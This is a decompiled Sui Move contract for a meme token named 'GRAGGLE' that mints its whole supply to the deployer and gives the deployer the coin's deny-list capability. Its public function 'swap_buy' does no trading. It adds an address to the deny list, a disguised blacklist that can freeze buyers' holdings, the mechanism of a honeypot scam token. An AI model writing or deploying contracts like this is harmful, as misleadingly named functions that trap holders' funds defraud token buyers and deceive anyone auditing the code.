module 0xb005032ac6f49d07d590582f41ac1a68d41241d840beea826e114f629779ee37::graggle {
    struct GRAGGLE has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GRAGGLE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GRAGGLE>(arg0, 9, b"GRAGGLE", b"Graggle Simpson", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://pbs.twimg.com/profile_images/1850374908439588864/4oE76aax_400x400.jpg"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GRAGGLE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GRAGGLE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GRAGGLE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GRAGGLE>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GRAGGLE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GRAGGLE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

